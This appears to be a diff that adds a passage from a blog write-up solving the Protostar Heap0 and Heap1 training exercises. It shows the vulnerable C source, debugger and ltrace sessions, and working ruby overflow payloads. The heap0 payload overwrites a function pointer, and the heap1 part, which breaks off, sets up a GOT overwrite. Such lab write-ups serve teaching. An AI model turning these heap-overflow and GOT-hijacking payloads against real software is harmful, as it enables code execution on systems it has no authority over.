@@ -9,30 +9,8 @@
   <meta name="author" content="Norbert Szetei">
 
   
-  <meta name="description" content="Image: Exploit-Exercises: Protostar (v2) Protostar Format0 format0.c 1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-#include &lt;stdlib. &hellip;">
+  <meta name="description" content="Image: Exploit-Exercises: Protostar (v2) 1
+user@protostar:~$ wget https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt --no-check- &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -101,6 +79,1429 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/07/04/exploit-exercises-protostar-heap-levels/">Exploit-Exercises: Protostar (Heap Levels)</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-07-04T09:29:50+02:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>4</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:29 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ wget https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt --no-check-certificate -O ~/.gdbinit -q</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Protostar Heap0</h2>
+
+<figure class='code'><figcaption><span>heap0.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">struct</span> <span class="n">data</span> <span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span><span class='line'><span class="p">};</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">struct</span> <span class="n">fp</span> <span class="p">{</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
+</span><span class='line'><span class="p">};</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">winner</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;level passed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">nowinner</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;level has not been passed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="k">struct</span> <span class="n">data</span> <span class="o">*</span><span class="n">d</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">struct</span> <span class="n">fp</span> <span class="o">*</span><span class="n">f</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">d</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">data</span><span class="p">));</span>
+</span><span class='line'>  <span class="n">f</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">fp</span><span class="p">));</span>
+</span><span class='line'>  <span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span> <span class="o">=</span> <span class="n">nowinner</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;data is at %p, fp is at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">d</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ gdb -q /opt/protostar/bin/heap0 
+</span><span class='line'>Really redefine built-in command "frame"? (y or n) [answered Y; input not from terminal]
+</span><span class='line'>Really redefine built-in command "thread"? (y or n) [answered Y; input not from terminal]
+</span><span class='line'>Really redefine built-in command "start"? (y or n) [answered Y; input not from terminal]
+</span><span class='line'>Reading symbols from /opt/protostar/bin/heap0...done.
+</span><span class='line'>
+</span><span class='line'>gdb> r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+</span><span class='line'>data is at 0x804a008, fp is at 0x804a050
+</span><span class='line'>
+</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
+</span><span class='line'>_______________________________________________________________________________
+</span><span class='line'>     eax:41346341 ebx:B7FD7FF4  ecx:00000000  edx:00000065     eflags:00210246
+</span><span class='line'>     esi:00000000 edi:00000000  esp:BFFFF70C  ebp:BFFFF738     eip:41346341
+</span><span class='line'>     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
+</span><span class='line'>[007B:BFFFF70C]---------------------------------------------------------[stack]
+</span><span class='line'>BFFFF73C : 76 DC EA B7  02 00 00 00 - E4 F7 FF BF  F0 F7 FF BF v...............
+</span><span class='line'>BFFFF72C : 50 A0 04 08  20 85 04 08 - 00 00 00 00  B8 F7 FF BF P... ...........
+</span><span class='line'>BFFFF71C : 38 F7 FF BF  65 63 EC B7 - 40 10 FF B7  08 A0 04 08 8...ec..@.......
+</span><span class='line'>BFFFF70C : FF 84 04 08  08 A0 04 08 - 1D F9 FF BF  50 A0 04 08 ............P...
+</span><span class='line'>[007B:41346341]---------------------------------------------------------[ data]
+</span><span class='line'>41346341 : Error while running hook_stop:
+</span><span class='line'>Cannot access memory at address 0x41346341
+</span><span class='line'>0x41346341 in ?? ()</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>0x41346341</code> represents the offset 72, also <code>0x804a050 - 0x804a008 = 72</code>. So we
+write 64B to <code>d-&gt;name</code> and after another 8B, there is the address of <code>fp</code>.</p>
+
+<p>To verify our statement, we use ltrace and gdb:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap0 1337
+</span><span class='line'>__libc_start_main(0x804848c, 2, 0xbffff844, 0x8048520, 0x8048510 &lt;unfinished ...>
+</span><span class='line'>malloc(64)                                                      = 0x0804a008
+</span><span class='line'>malloc(4)                                                       = 0x0804a050
+</span><span class='line'>printf("data is at %p, fp is at %p\n", 0x804a008, 0x804a050data is at 0x804a008, f
+</span><span class='line'>)                                                                  = 41
+</span><span class='line'>strcpy(0x0804a008, "1337")                                      = 0x0804a008
+</span><span class='line'>puts("level has not been passed"level has not been passed
+</span><span class='line'>)    = 26
+</span><span class='line'>+++ exited (status 26) +++</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ gdb -q /opt/protostar/bin/heap0 
+</span><span class='line'>Really redefine built-in command "frame"? (y or n) [answered Y; input not from terminal]
+</span><span class='line'>Really redefine built-in command "thread"? (y or n) [answered Y; input not from terminal]
+</span><span class='line'>Really redefine built-in command "start"? (y or n) [answered Y; input not from terminal]
+</span><span class='line'>Reading symbols from /opt/protostar/bin/heap0...done.
+</span><span class='line'>
+</span><span class='line'>gdb> b *0x80484ff
+</span><span class='line'>Breakpoint 1 at 0x80484ff: file heap0/heap0.c, line 40.
+</span><span class='line'>
+</span><span class='line'>gdb> r $(ruby -e 'print "X" * 64')
+</span><span class='line'>data is at 0x804a008, fp is at 0x804a050
+</span><span class='line'>level has not been passed
+</span><span class='line'>_______________________________________________________________________________
+</span><span class='line'>     eax:0000001A ebx:B7FD7FF4  ecx:B7FD84C0  edx:B7FD9340     eflags:00200246
+</span><span class='line'>     esi:00000000 edi:00000000  esp:BFFFF730  ebp:BFFFF758     eip:080484FF
+</span><span class='line'>     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
+</span><span class='line'>[007B:BFFFF730]---------------------------------------------------------[stack]
+</span><span class='line'>BFFFF760 : 02 00 00 00  04 F8 FF BF - 10 F8 FF BF  48 18 FE B7 ............H...
+</span><span class='line'>BFFFF750 : 20 85 04 08  00 00 00 00 - D8 F7 FF BF  76 DC EA B7  ...........v...
+</span><span class='line'>BFFFF740 : 65 63 EC B7  40 10 FF B7 - 08 A0 04 08  50 A0 04 08 ec..@.......P...
+</span><span class='line'>BFFFF730 : 08 A0 04 08  41 F9 FF BF - 50 A0 04 08  58 F7 FF BF ....A...P...X...
+</span><span class='line'>[007B:BFFFF730]---------------------------------------------------------[ data]
+</span><span class='line'>BFFFF730 : 08 A0 04 08  41 F9 FF BF - 50 A0 04 08  58 F7 FF BF ....A...P...X...
+</span><span class='line'>BFFFF740 : 65 63 EC B7  40 10 FF B7 - 08 A0 04 08  50 A0 04 08 ec..@.......P...
+</span><span class='line'>[0073:080484FF]---------------------------------------------------------[ code]
+</span><span class='line'>0x80484ff &lt;main+115>:  leave  
+</span><span class='line'>0x8048500 &lt;main+116>:  ret    
+</span><span class='line'>0x8048501:    nop
+</span><span class='line'>0x8048502:    nop
+</span><span class='line'>0x8048503:    nop
+</span><span class='line'>0x8048504:    nop
+</span><span class='line'>------------------------------------------------------------------------------
+</span><span class='line'>
+</span><span class='line'>Breakpoint 1, main (argc=0x2, argv=0xbffff804) at heap0/heap0.c:40
+</span><span class='line'>40    heap0/heap0.c: No such file or directory.
+</span><span class='line'>  in heap0/heap0.c
+</span><span class='line'>
+</span><span class='line'>gdb> x /25x 0x0804a000
+</span><span class='line'>0x804a000:    0x00000000  0x00000049  0x58585858  0x58585858
+</span><span class='line'>0x804a010:    0x58585858  0x58585858  0x58585858  0x58585858
+</span><span class='line'>0x804a020:    0x58585858  0x58585858  0x58585858  0x58585858
+</span><span class='line'>0x804a030:    0x58585858  0x58585858  0x58585858  0x58585858
+</span><span class='line'>0x804a040:    0x58585858  0x58585858  0x00000000  0x00000011
+</span><span class='line'>0x804a050:    0x08048478  0x00000000  0x00000000  0x00020fa9
+</span><span class='line'>0x804a060:    0x00000000</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(08) 0x0804a000: d-control
+</span><span class='line'>(64) 0x0804a008: d-name
+</span><span class='line'>
+</span><span class='line'>(08) 0x0804a048: f-control
+</span><span class='line'>(04) 0x0804a050: f-fp</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We set <code>fp</code> to <code>winner()</code> symbol:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ nm /opt/protostar/bin/heap0 | grep winner
+</span><span class='line'>08048478 T nowinner
+</span><span class='line'>08048464 T winner
+</span><span class='line'>
+</span><span class='line'>user@protostar:~$ /opt/protostar/bin/heap0 $(ruby -e 'print "X"*72 + [0x08048464].pack("V")')
+</span><span class='line'>data is at 0x804a008, fp is at 0x804a050
+</span><span class='line'>level passed</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Protostar Heap1</h2>
+
+<figure class='code'><figcaption><span>heap1.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">struct</span> <span class="n">internet</span> <span class="p">{</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">priority</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
+</span><span class='line'><span class="p">};</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">winner</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;and we have a winner @ %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="k">struct</span> <span class="n">internet</span> <span class="o">*</span><span class="n">i1</span><span class="p">,</span> <span class="o">*</span><span class="n">i2</span><span class="p">,</span> <span class="o">*</span><span class="n">i3</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">i1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">internet</span><span class="p">));</span>
+</span><span class='line'>  <span class="n">i1</span><span class="o">-&gt;</span><span class="n">priority</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">i2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">internet</span><span class="p">));</span>
+</span><span class='line'>  <span class="n">i2</span><span class="o">-&gt;</span><span class="n">priority</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;and that&#39;s a wrap folks!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap1 AAAA BBBB
+</span><span class='line'>__libc_start_main(0x80484b9, 3, 0xbffff834, 0x8048580, 0x8048570 &lt;unfinished ...>
+</span><span class='line'>malloc(8)                        = 0x0804a008
+</span><span class='line'>malloc(8)                        = 0x0804a018
+</span><span class='line'>malloc(8)                        = 0x0804a028
+</span><span class='line'>malloc(8)                        = 0x0804a038
+</span><span class='line'>strcpy(0x0804a018, "AAAA")       = 0x0804a018
+</span><span class='line'>strcpy(0x0804a038, "BBBB")       = 0x0804a038
+</span><span class='line'>puts("and that's a wrap folks!"and that's a wrap folks!
+</span><span class='line'>)                   = 25
+</span><span class='line'>+++ exited (status 25) +++</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We have four allocated chunks in memory:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(8) 0x0804a000: i1-control
+</span><span class='line'>(4) 0x0804a008: i1-priority
+</span><span class='line'>(4) 0x0804a00c: i1-name(addr)
+</span><span class='line'>
+</span><span class='line'>(8) 0x0804a010: i1-name-control
+</span><span class='line'>(8) 0x0804a018: i1-name
+</span><span class='line'>
+</span><span class='line'>(8) 0x0804a020: i2-control
+</span><span class='line'>(4) 0x0804a028: i2-priority
+</span><span class='line'>(4) 0x0804a02c: i2-name(addr)
+</span><span class='line'>
+</span><span class='line'>(8) 0x0804a030: i2-name-control
+</span><span class='line'>(8) 0x0804a038: i2-name</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After 20 bytes, we are able to change <code>i2-name(addr)</code>, that is used by second <code>strcpy()</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace -e strcpy /opt/protostar/bin/heap1 $(ruby -e 'print "A" * 20 + [0x44444444].pack("V") ') 2222
+</span><span class='line'>strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAADDDD")      = 0x0804a018
+</span><span class='line'>strcpy(0x44444444, "2222" &lt;unfinished ...>
+</span><span class='line'>--- SIGSEGV (Segmentation fault) ---
+</span><span class='line'>+++ killed by SIGSEGV +++</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We use <code>Global Offset Table Hijacking</code> technique:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ objdump -TR /opt/protostar/bin/heap1 
+</span><span class='line'>
+</span><span class='line'>/opt/protostar/bin/heap1:     file format elf32-i386
+</span><span class='line'>
+</span><span class='line'>DYNAMIC SYMBOL TABLE:
+</span><span class='line'>00000000  w   D  *UND*    00000000              __gmon_start__
+</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   __libc_start_main
+</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   strcpy
+</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   printf
+</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   time
+</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   malloc
+</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   puts
+</span><span class='line'>0804862c g    DO .rodata  00000004  Base        _IO_stdin_used
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>DYNAMIC RELOCATION RECORDS
+</span><span class='line'>OFFSET   TYPE              VALUE 
+</span><span class='line'>0804974c R_386_GLOB_DAT    __gmon_start__
+</span><span class='line'>0804975c R_386_JUMP_SLOT   __gmon_start__
+</span><span class='line'>08049760 R_386_JUMP_SLOT   __libc_start_main
+</span><span class='line'>08049764 R_386_JUMP_SLOT   strcpy
+</span><span class='line'>08049768 R_386_JUMP_SLOT   printf
+</span><span class='line'>0804976c R_386_JUMP_SLOT   time
+</span><span class='line'>08049770 R_386_JUMP_SLOT   malloc
+</span><span class='line'>08049774 R_386_JUMP_SLOT   puts
+</span><span class='line'>
+</span><span class='line'>user@protostar:~$ nm /opt/protostar/bin/heap1 | grep winner
+</span><span class='line'>08048494 T winner</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Goal is to write the value <code>0x08048494</code> to the <code>0x08049774</code> address.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>strcpy(i1->name, argv[1]):
+</span><span class='line'>(8) 0x0804a000: i1-control
+</span><span class='line'>(4) 0x0804a008: i1-priority
+</span><span class='line'>(4) 0x0804a00c: i1-name(addr)
+</span><span class='line'>
+</span><span class='line'>(8) 0x0804a010: i1-name-control
+</span><span class='line'>(8) 0x0804a018: i1-name             # AAAAAAAA
+</span><span class='line'>
+</span><span class='line'>(8) 0x0804a020: i2-control          # AAAAAAAA
+</span><span class='line'>(4) 0x0804a028: i2-priority         # AAAA
+</span><span class='line'>(4) 0x0804a02c: i2-name(addr)       # [0x08049774].pack("V")
+</span><span class='line'>
+</span><span class='line'>(8) 0x0804a030: i2-name-control     
+</span><span class='line'>(8) 0x0804a038: i2-name             
+</span><span class='line'>
+</span><span class='line'>strcpy(i2->name, argv[2]):
+</span><span class='line'>(8) 0x0804a000: i1-control
+</span><span class='line'>(4) 0x0804a008: i1-priority
+</span><span class='line'>(4) 0x0804a00c: i1-name(addr)
+</span><span class='line'>
